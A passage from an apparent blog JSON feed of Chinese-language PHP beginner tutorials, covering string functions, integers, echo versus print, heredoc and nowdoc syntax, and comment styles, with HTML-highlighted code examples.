single-quoted-string\">'uyuyuyuyuyuyuyuoooooo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$length</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $length 等于 21</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$length</span> <span class=\"token comment\">// 输出 21</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--substr () 从字符串中提取子串 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$pos</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ls-cat-burp-xss-sql'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$iu</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pos</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 截取 0 到 3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$iu</span> <span class=\"token comment\">// 输出 ls-</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--strpos () 查找子串在字符串中第一次出现的位置 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$pos</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ls cat burp xss sql'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$iu</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pos</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$iu</span> <span class=\"token comment\">// 输出 12</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--str_replace () 替换 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$mm</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'你好，python'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$zz</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'python'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$mm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将 python 替换为 php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$zz</span> <span class=\"token comment\">// 输出你好，php</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--strtoupper () 转换为大写 strtolower () 转换为小写 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$qq</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'qweasdzxc'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$oo</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'QWERTYUIOP'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$aa</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtoupper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$qq</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 转换为大写</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$aa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$bb</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$oo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$bb</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--trim ()：去除字符串两端的空格或特定字符。--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$po</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'  php  '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$tt</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$po</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$tt</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--explode () /implode ()：将字符串拆分为数组 / 将数组元素连接成字符串。--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$bv</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'www，yyy，uuu，iii'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$as</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'，'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$bv</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$as</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$as</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$name</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--printf () /sprintf ()：格式化字符串输出。--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">&lt;!--% s 是字符串占位符，--></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">&lt;!--% d 是整数占位符。--></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">&lt;!--% f：浮点数占位符，用于输出浮点数。--></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">&lt;!--% x 或 % X：十六进制整数占位符，分别用于输出小写或大写的十六进制数。--></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">&lt;!--% b：二进制整数占位符，用于输出二进制数。--></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">&lt;!--% e 或 % E：科学计数法表示的浮点数占位符，分别用于小写或大写的指数部分。--></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token number\">123445</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户=%s,密码=%d'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 输出用户 = admin, 密码 = 123445</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user=%s,pass=%d'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$admin</span><span class=\"token comment\">// 输出 user=admin,pass=123445</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--str_split ()：将字符串拆分为字符数组。--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$er</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$kl</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_split</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$er</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$kl</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $chars 等于 ['a', 'd', 'm', 'i', 'n']</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"整数\"><a class=\"markdownIt-Anchor\" href=\"#整数\">#</a> 整数</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$positive_integer</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 正整数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$negative_integer</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 负整数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$zero</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 零</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$positive_integer</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$negative_integer</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$zero</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHPecho%E5%92%8Cprint%E8%AF%AD%E5%8F%A5/PHPecho%E5%92%8Cprint%E8%AF%AD%E5%8F%A5/",
            "url": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/PHPecho%E5%92%8Cprint%E8%AF%AD%E5%8F%A5/PHPecho%E5%92%8Cprint%E8%AF%AD%E5%8F%A5/",
            "title": "PHPecho和print语句",
            "date_published": "2023-11-16T09:35:40.000Z",
            "content_html": "<p>在 PHP 中，  <code>echo</code>  和   <code>print</code>  都用于输出数据到屏幕。这两者之间有一些小差异：</p>\n<h3 id=\"echo\"><a class=\"markdownIt-Anchor\" href=\"#echo\">#</a> <span class=\"rainbow\">echo </span></h3>\n<ul>\n<li><code>echo</code>  是一个语言结构，可以快速地输出一个或多个字符串。</li>\n<li>它比   <code>print</code>  稍快，因为它没有返回值。</li>\n<li><code>echo</code>  可以接受多个参数（这种用法不常见）。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token number\">1234</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 输出字符串</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"This \"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"string \"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"was \"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"made \"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"with multiple parameters.\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 输出字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token comment\">// 输出变量</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/php/image-20231116175718835.png\" alt=\"image-20231116175718835\"></p>\n<h3 id=\"print\"><a class=\"markdownIt-Anchor\" href=\"#print\">#</a> <span class=\"rainbow\">print </span></h3>\n<ul>\n<li><code>print</code>  也是一个语言结构，但它只允许输出一个字符串，并总  <code>1</code> 。</li>\n<li>因此，  <code>print</code>  可以用在表达式中。</li>\n<li>相比于  <code>echo</code> ， <code>print</code>  的使用略微受限。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出字符串</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 由于 print 总是返回 1，它可以被用在表达式中</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"This is a test.\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出变量</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// $result 的值为 1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/php/image-20231116183157154.png\" alt=\"image-20231116183157154\"></p>\n<h3 id=\"eofend-of-file\"><a class=\"markdownIt-Anchor\" href=\"#eofend-of-file\">#</a> <span class=\"rainbow\">EOF（End Of File）</span></h3>\n<p>是一个用于在脚本中指定一个字符串的结束的标识符。它经常与 heredoc 语法结合使用，来定义一个字符串，这个字符串中可以包含多行文本、变量、特殊字符等，而不需要担心字符串的引用问题。</p>\n<p><span class=\"rainbow\">插入复杂结构</span></p>\n<ul>\n<li>当你需要插入大量的 HTML 或者 SQL 语句时，heredoc 语法特别有用，它可以保持原格式不变，增加代码的可读性。</li>\n</ul>\n<p><span class=\"rainbow\">EOF 标识符命名：</span></p>\n<ul>\n<li>EOF 只是一个约定的标识符。你可以使用任何合法的标识符作为 heredoc 或 nowdoc 的开始和结束标记.</li>\n</ul>\n<p><span class=\"rainbow\">Heredoc 语法；</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>EOF</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>这里是文本字符串的内容，可以跨越多行。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>它的结束标识符是“EOF”，位于行首，且后面紧跟一个分号。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>变量也可以被解析，例如：<span class=\"token interpolation\"><span class=\"token variable\">$variable</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter symbol\">EOF<span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 注意结束标识符 EOF 前不能有任何字符，包括空格和制表符。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"rainbow\">在参数中直接使用 heredoc：</span></p>\n<ul>\n<li>heredoc 可以直接在函数或方法的参数中使用，无需先赋值给变量</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">printText</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$text</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">printText</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">&lt;</span><span class=\"token string single-quoted-string\">'TEXT'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Line <span class=\"token number\">1</span> of the <span class=\"token keyword type-declaration\">string</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Line <span class=\"token number\">2</span> of the <span class=\"token keyword type-declaration\">string</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token constant\">TEXT</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"rainbow\">nowdoc 语法：</span></p>\n<ul>\n<li>类似于 heredoc，但是不解析其中的变量，适用于需要保持字符串内变量不变的情况。其语法使用单引号定义标识符。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string nowdoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;'</span>EOD<span class=\"token punctuation\">'</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Example of string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>spanning multiple lines</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>using nowdoc syntax.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>$variable will not be parsed.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter symbol\">EOD<span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/php%E8%AF%AD%E6%B3%95-%E5%8F%98%E9%87%8F/php%E8%AF%AD%E6%B3%95-%E5%8F%98%E9%87%8F/",
            "url": "http://gyzero.shop/2023/11/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/php%E5%9F%BA%E7%A1%80/php%E8%AF%AD%E6%B3%95-%E5%8F%98%E9%87%8F/php%E8%AF%AD%E6%B3%95-%E5%8F%98%E9%87%8F/",
            "title": "php语法-变量",
            "date_published": "2023-11-16T07:41:03.000Z",
            "content_html": "<p>PHP 语言在网络安全方面扮演着重要的角色，主要因为它是最流行的服务器端脚本语言之一，广泛用于网页开发。然而，由于其广泛的使用和某些特性，PHP 也与多种网络安全问题相关联。</p>\n<p>PHP 是一种广泛使用的开源脚本语言，特别适合于网页开发，并且可以嵌入到 HTML 中。下面是一些基本的 PHP 语法要点：</p>\n<h3 id=\"基本语法\"><a class=\"markdownIt-Anchor\" href=\"#基本语法\">#</a> <mark>基本语法</mark></h3>\n<ul>\n<li>PHP 脚本以  <code>&lt;?php</code>  开始，以  <code>?&gt;</code>  结束。</li>\n<li>PHP 脚本可以放在 HTML 文档中的任何位置。</li>\n<li>PHP 语句以分号  <code>;</code>  结束。</li>\n</ul>\n<p>例如；</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>网页端就会返回</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/php/image-20231116160229423.png\" alt=\"image-20231116160229423\"></p>\n<h3 id=\"注释\"><a class=\"markdownIt-Anchor\" href=\"#注释\">#</a> <mark>注释</mark></h3>\n<ul>\n<li>单行注释可以用  <code>//</code>  或  <code>#</code> 。</li>\n<li>多行注释使用  <code>/* 注释内容 */</code> 。</li>\n</ul>\n<h4 id=\"单行注释\"><a class=\"markdownIt-Anchor\" href=\"#单行注释\">#</a> <mark>单行注释</mark></h4>\n<ul>\n<li>使用两个正斜杠  <code>//</code>  开始的注释。从  <code>//</code>  开始到行末的所有内容都会被视为注释。</li>\n<li>井号  <code>#</code>  也可以用于单行注释，它的作用与  <code>//</code>  相同。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 这是一个单行注释</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 这也是一个单行注释</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"PHP is fun!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h4 id=\"多行注释\"><a class=\"markdownIt-Anchor\" href=\"#多行注释\">#</a> <mark>多行注释</mark></h4>\n<ul>\n<li>由一对  <code>/*</code>  和  <code>*/</code>  包裹的注释。这种注释可以跨越多行。</li>\n<li>多行注释通常用于提供关于代码块的详细说明或者在需要时临时移除代码块。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/* 这是一个多行注释</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   它跨越了</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   多行 */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h4 id=\"文档性注释\"><a class=\"markdownIt-Anchor\" href=\"#文档性注释\">#</a> <mark>文档性注释</mark></h4>\n<ul>\n<li>用于生成文档的特殊多行注释，以两个星号开始  <code>/**</code> ，然后是多行注释内容，最后以  <code>*/</code>  结束。</li>\n<li>这种注释风格通常用于自动化的文档生成工具，比如 PHPDocumentor。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * 获取用户名称</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * 该函数用于从数据库获取用户名称</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @param int $userID 用户 ID</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> * @return string 